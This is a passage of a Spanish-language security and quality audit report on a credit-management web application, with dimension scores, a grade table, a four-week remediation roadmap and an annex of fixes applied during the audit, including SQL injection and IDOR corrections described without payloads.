(`estado`, `estado_credito`, `estado_eval`). Ya existe el motor único
(`shared/etapa-credito.js`) que las escribe juntas, pero la estructura sigue permitiendo el
desacuerdo. La solución definitiva es una columna con las otras dos como vistas.

## 6.4 Rendimiento — 7/10

**El sistema no tiene un problema de rendimiento hoy.** Tiene un problema de **costo por
consulta**, que es distinto y más silencioso: cada consulta a TiDB se factura, y el sistema
hace consultas de más (M-7, M-8, sin caché de UF ni mantenedores).

Puntos de atención: N+1 en Mi Día, `DESCRIBE` por petición, ausencia de caché en datos que
casi no cambian, migraciones que alargan el arranque en frío, y dos archivos frontend de
5.000 líneas que se descargan enteros.

## 6.5 Backend — 7,5/10

Respuestas uniformes (911 de 943 siguen la convención), validación de entrada presente en
las rutas revisadas, manejo de errores centralizado con sanitización de 500, transacciones
correctamente aplicadas en los caminos de dinero verificados (`createBatch`, `prepagar`,
`reversar`, motor de asientos, órdenes de pago). Los huecos son los ya citados: M-3, M-4, A-1.

## 6.6 Frontend — 6/10

Vanilla JS sin proceso de build: cero deuda de framework, cero vulnerabilidades transitivas
de npm en el navegador, y páginas que cargan rápido. El precio: sin `code splitting`, sin
componentes reutilizables (CSS repetido 275 veces), archivos gigantes y escapado de HTML
aplicado a mano — que es exactamente de donde salen A-2 y A-3.

## 6.7 Accesibilidad y experiencia — 6,5/10

Lo bueno: las 275 páginas declaran `lang`, la navegación es consistente, hay migas de pan
con regla propia y cada mantenedor termina con un recuadro "Qué afecta este mantenedor" que
es una idea genuinamente buena y poco común.

Lo pendiente: 238 campos sin etiqueta accesible, 23 imágenes sin `alt`, contraste sin
verificar y navegación por teclado sin probar. Nunca se auditó con herramientas.

## 6.8 DevOps — 5/10

**A favor:** despliegue automático, `/api/health` con verificación real de base de datos,
respaldo nocturno con doble destino, monitor de uptime por servicio cada 5 minutos, alerta
por correo ante cada 500 con límite de frecuencia, y un runbook de contingencia con
restauración **efectivamente probada**.

**En contra:** sin ambiente de staging (B-2), sin CI de calidad, sin protección de rama, 37
variables de entorno sin documentar (A-4), sin host alternativo (B-4).

## 6.9 Testing — 1/10

No existe. Ver B-3.

## 6.10 Documentación — 9/10

**Lo mejor del proyecto, y por un margen amplio.** Cinco documentos vivos, un plan de QA con
150+ casos priorizados, un plan de staging con costos estimados, un runbook de contingencia
con gotchas reales aprendidos en un ensayo, y comentarios en el código que explican *por qué*
—incluyendo los bugs que motivaron cada decisión— en vez de repetir lo que el código ya dice.

Es material de una calidad que rara vez se encuentra en empresas mucho más grandes. El único
desfase detectado es B-10.

---

# 7. Tabla de calificaciones

| Dimensión | Nota | Comentario |
|---|:---:|---|
| Arquitectura | **6,5** | Anti-hardcode ejemplar; penaliza el proceso único |
| Seguridad | **6,5** | Base sólida; XSS y CSP pendientes |
| Rendimiento | **7,0** | Sano; el problema es costo por consulta |
| Escalabilidad | **5,0** | Un proceso, un host, sin aislamiento |
| Mantenibilidad | **6,0** | Convenciones consistentes; archivos gigantes y sin pruebas |
| Legibilidad | **8,5** | Comentarios que narran decisiones de negocio |
| Base de datos | **7,0** | Integridad impecable sin estructura que la exija |
| Backend | **7,5** | Sólido y consistente |
| Frontend | **6,0** | Rápido y sin deuda de framework; escapado manual |
| UX / Accesibilidad | **6,5** | Coherente; accesibilidad sin auditar |
| DevOps | **5,0** | Buen monitoreo, sin ambiente de pruebas |
| Testing | **1,0** | Inexistente |
| Documentación | **9,0** | Excepcional |
| **GENERAL** | **6,4** | **Sano en operación, sin red de seguridad de proceso** |

*(La nota general baja respecto del 6,9 de la auditoría preliminar de esta mañana no porque
el sistema haya empeorado —de hecho mejoró— sino porque esta revisión fue más profunda y
sumó los ejes de proceso: ambiente, continuidad y variables de entorno.)*

---

# 8. Roadmap a la certificación

## Semana 1 — Bloqueantes de seguridad y correcciones rápidas

| # | Acción | Esfuerzo |
|---|---|---|
| 1 | **B-1**: Modo Desarrollo a prueba de fallos (fail-safe) | 15 min |
| 2 | **A-2**: escapar `motivo_rechazo` y `revisor_nombre` | 5 min |
| 3 | **A-3**: escapar nombres en los rankings del dashboard | 10 min |
| 4 | **A-1**: `process.exit(1)` tras `uncaughtException` | 15 min |
| 5 | **A-5**: rate limiting global en `/api` | 2 h |
| 6 | **A-9**: exportar y eliminar las 4 tablas de respaldo restantes | 30 min |
| 7 | **A-4**: completar `.env.example` (44 variables) + verificación al arranque | 2 h |
| 8 | **A-8**: reintento ante duplicado en `num_op` | 1 h |

**Total: menos de un día de trabajo.** Cierra 6 de 9 hallazgos altos y 1 bloqueante.

## Semana 2 — Pruebas automatizadas (B-3)

Los 7 motores de la tabla de B-3, con `node --test`. Sin framework, sin dependencias.
Criterio de término: las tres regresiones de esta semana quedan cubiertas por una prueba que
las habría detectado.

## Semana 3 — Ambiente de staging (B-2)

Ejecutar `docs/plan-staging-prod.md` en su orden: Fase 4 → Fase 1 → Fases 2 y 3 → Fase 5.
Añadir el workflow de CI (`node --check` + pruebas de la semana 2).

## Semana 4 — Continuidad y certificación (B-4)

- Ensayar un despliegue real en host alternativo, **o** firmar la aceptación del riesgo.
- Ejecutar `docs/qa-plan-produccion.md` completo **en staging**.
- Cumplir su checklist de salida: P0 todos en verde, motores automáticos verificados y luego
  desactivados, congelamiento de despliegues 48 horas antes, responsables definidos.

## Después de certificar — deuda estructural

`xlsx` aislado o reemplazado (A-7) · `token_version` (A-6) · CSP (M-9) · unificar los dos
rate limiters y las cinco fechas (M-1, M-2) · cerrar los huecos contables (M-3, M-4) · sacar
las migraciones del arranque (M-12) · caché de UF y mantenedores · dividir los dos archivos
de 5.000 líneas (M-13) · auditoría de accesibilidad.

---

# 9. Anexo — Correcciones aplicadas durante la auditoría

| # | Hallazgo | Acción | Verificación |
|---|---|---|---|
| C-1 | Inyección SQL en Tablas Dinámicas vía `alias` | `aliasSeguro()` aplicado a `alias` y `orden_campo` | El payload de la PoC queda neutralizado; los alias legítimos se conservan |
| C-2 | 35 tablas de respaldo con datos personales | 27 eliminadas (53.311 filas), 32 exportadas a ZIP en disco | Producción verificada intacta; arranque OK. **Quedan 8 + 4 nuevas de A-9** |
| A-1 | Override de zona horaria sin permiso | `requireFunc('mant_servidor_hora','mantenedores_solo_dios')` | Ruta protegida |
| A-2 | IDOR sobre antecedentes laborales e información comercial | `requireFunc` en lectura y escritura | Rutas protegidas |
| A-3 | Dependencias vulnerables | `npm audit fix`: de 7 a 3 vulnerabilidades | Gateway arrancado y verificado |

**Correcciones a mis propias conclusiones preliminares** (registradas por honestidad del método):

1. Los conteos de filas por `information_schema.table_rows` son **estimaciones** en TiDB. Al
   contar de verdad, solo 2 tablas estaban vacías, no 8.
2. El patrón de limpieza `bkp_%`/`tmp_%` **no era exhaustivo**: dejó fuera 4 tablas de
   respaldo con otra convención de nombre (A-9).
3. La auditoría preliminar recomendaba agregar guardas `uncaughtException`; **ya existían**.
   El hallazgo correcto es el opuesto: existen pero no terminan el proceso (A-1).

---

**Fin del informe.**
*Auditoría ejecutada el 03-08-2026 sobre la versión v171.4. Los hallazgos incluyen archivo y
línea para su verificación independiente. Las afirmaciones sobre datos provienen de consultas
ejecutadas contra la base de producción durante la auditoría.*
